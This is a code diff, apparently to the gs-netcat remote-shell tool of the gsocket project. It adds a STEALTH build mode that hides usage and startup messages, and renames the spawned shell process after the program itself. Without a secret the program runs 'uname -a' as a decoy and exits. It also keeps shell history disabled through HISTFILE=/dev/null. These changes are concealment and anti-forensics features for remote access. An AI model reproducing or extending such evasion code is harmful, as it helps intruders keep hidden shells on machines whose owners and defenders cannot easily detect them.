@@ -7,7 +7,6 @@
 
 extern char **environ;
 
-
 /*
  * Add list of argv's from GSOCKET_ARGS to argv[]
  * result: argv[0] + GSOCKET_ARGS + argv[1..n]
@@ -16,6 +15,8 @@ static void
 add_env_argv(int *argcptr, char **argvptr[])
 {
 	char *str_orig = GS_getenv("GSOCKET_ARGS");
+	if (str_orig == NULL)
+		str_orig = GS_getenv("GS_ARGS");
 	char *str = NULL;
 	char *next;
 	char **newargv = NULL;
@@ -82,6 +83,21 @@ init_defaults(int *argcptr, char **argvptr[])
 	gopt.err_fp = stderr;
 	signal(SIGPIPE, SIG_IGN);
 	signal(SIGCHLD, SIG_IGN);	// no defunct childs please
+	gopt.prg_name = NULL;
+	if (argvptr != NULL)
+	{
+		gopt.prg_name = *argvptr[0];
+
+		if ((gopt.prg_name != NULL) && (gopt.prg_name[0] == '/'))
+		{
+			char *ptr;
+			ptr = strrchr(gopt.prg_name, '/');
+			if (ptr != NULL)
+				gopt.prg_name = ptr + 1;
+		}
+		if (gopt.prg_name != NULL)
+			gopt.prg_name = strdup(gopt.prg_name);
+	}
 
 	/* MacOS process limit is 256 which makes Socks-Proxie yield...*/
 	struct rlimit rlim;
@@ -140,9 +156,6 @@ static void
 cb_gs_log(struct _gs_log_info *l)
 {
 	if (l == NULL)
-		return;
-
-	if (gopt.is_quiet)
 		return;
 
 	// DEBUGF_Y("my level=%d, msg level=%d\n", gopt.verbosity, l->level);
@@ -205,19 +218,38 @@ init_vars(void)
 
 	// Prevent startup messages if gs-netcat is started as sub-system from
 	// gs-sftp or gs-mount
-	int is_greetings = 1;
+	gopt.is_greetings = 1;
 	if (GS_getenv("GSOCKET_NO_GREETINGS") != NULL)
-		is_greetings = 0;
+		gopt.is_greetings = 0;
 
-	char *str = GS_getenv("GSOCKET_ARGS");
-	if ((str != NULL) && (is_greetings))
-		GS_LOG_V("=Extra arguments: '%s'\n", str);
+	char *gs_args = GS_getenv("GSOCKET_ARGS");
+	if (gs_args == NULL)
+		gs_args = GS_getenv("GS_ARGS");
+
+#ifdef STEALTH
+	// No "=Secret   :" if GS_ARGS is set as we assume secret is passed
+	// by GS_ARGS (and thus known to user)
+	if (gs_args != NULL)
+		gopt.is_greetings = 0;
+
+	// do not allow execution without supplied secret.
+	if (gs_args == NULL)
+	{
+		if ((gopt.sec_file == NULL) || (gopt.sec_str == NULL))
+		{
+			system("uname -a");
+			exit(0);
+		}
+	}
+#endif
+	if (gs_args != NULL)
+		GS_LOG_V("=Extra arguments: '%s'\n", gs_args);
 
 	gopt.sec_str = GS_user_secret(&gopt.gs_ctx, gopt.sec_file, gopt.sec_str);
 	if (gopt.sec_str == NULL)
 		ERREXIT("%s\n", GS_CTX_strerror(&gopt.gs_ctx));
 
-	if (is_greetings)
+	if (gopt.is_greetings)
 		GS_LOG("=Secret         : %s\n", gopt.sec_str);
 
 	/* Convert a secret string to an address */
@@ -233,6 +265,7 @@ usage(const char *params)
 {
 	fprintf(stderr, "Version %s%s, %s %s [%s]\n", PACKAGE_VERSION, gopt.is_built_debug?"#debug":"", __DATE__, __TIME__, OPENSSL_VERSION_TEXT);
 
+#ifndef STEALTH
 	while (*params)
 	{
 		switch (params[0])
@@ -280,6 +313,7 @@ usage(const char *params)
 
 		params++;
 	}
+#endif // !STEALTH
 }
 
 static void
@@ -366,9 +400,11 @@ do_getopt(int argc, char *argv[])
 				printf("%s\n", GS_gen_secret());
 				fflush(stdout);
 				exit(0);
+#ifndef STEALTH
 			case '3':
 				if (strcmp(optarg, "1337") == 0)
 					GS_LOG("!!Greets to 0xD1G, xaitax and the rest of https://t.me/thcorg!!\n");
+#endif
 		}
 	}
 }
@@ -478,16 +514,23 @@ mk_shellname(char *shell_name, ssize_t len)
 	struct stat sb;
 	if (stat("/bin/bash", &sb) == 0)
 		dfl_shell = "/bin/bash";
+	else if (stat("/usr/bin/bash", &sb) == 0)
+		dfl_shell = "/usr/bin/bash";
 
 	const char *shell = GS_getenv("SHELL");
-	if (shell == NULL)
+	if (shell != NULL)
 	{
-		shell = dfl_shell;
+		if ((strcmp(shell, "sh") == 0) || (strcmp(shell, "/bin/sh") == 0))
+			shell = NULL; 
 	}
+	if (shell == NULL)
+		shell = dfl_shell;
+
 	char *ptr = strrchr(shell, '/');
 	if (ptr == NULL)
 	{
-		// ENV is set but not a path. Perhaps just 'zsh' or 'bash'
+		// SHELL= is not an absolute path. Perhaps just 'zsh' or 'bash'
+		// Find the absolute path
 		shell = dfl_shell;
 		char buf[32];
 		snprintf(buf, sizeof buf, "/bin/%s", shell);
@@ -495,8 +538,16 @@ mk_shellname(char *shell_name, ssize_t len)
 			shell = strdup(buf);
 		ptr = strrchr(shell, '/');
 	}
-	snprintf(shell_name, len, "-%s", ptr + 1);
+	ptr += 1;
+#ifdef STEALTH
+	if (gopt.prg_name != NULL)
+		ptr = gopt.prg_name;
+	snprintf(shell_name, len, "%s", ptr);
+#else
+	snprintf(shell_name, len, "-%s", ptr);
+#endif
 
+	DEBUGF("shell=%s name=%s\n", shell, shell_name);
 	return shell;
 }
 
@@ -765,11 +816,12 @@ pty_cmd(const char *cmd, pid_t *pidptr)
 		snprintf(shell_env, sizeof shell_env, "SHELL=%s", shell);
 
 		char home_env[128];
-		snprintf(home_env, sizeof home_env, "HOME=/root");	// default
 		struct passwd *pwd;
 		pwd = getpwuid(getuid());
 		if (pwd != NULL)
 			snprintf(home_env, sizeof home_env, "HOME=%s", pwd->pw_dir);
+		else
+			snprintf(home_env, sizeof home_env, "HOME=/root");	// default
 
 		/* Remove some environment variables:
 		 * STY = Confuses screen if gs-netcat is started from within screen (OSX)
@@ -777,7 +829,7 @@ pty_cmd(const char *cmd, pid_t *pidptr)
 		 *    execute with same (hidden) commands as the current shell.
 		 * HISTFILE= does not work on oh-my-zsh (it sets it again)
 		 */
-		char *env_blacklist[] = {"STY", "GSOCKET_ARGS", "HISTFILE", NULL};
+		char *env_blacklist[] = {"STY", "GSOCKET_ARGS", "GS_ARGS", "HISTFILE", NULL};
 		char *env_addlist[] = {shell_env, "TERM=xterm-256color", "HISTFILE=/dev/null", home_env, NULL};
 		char **envp = mk_env(env_blacklist, env_addlist);
 
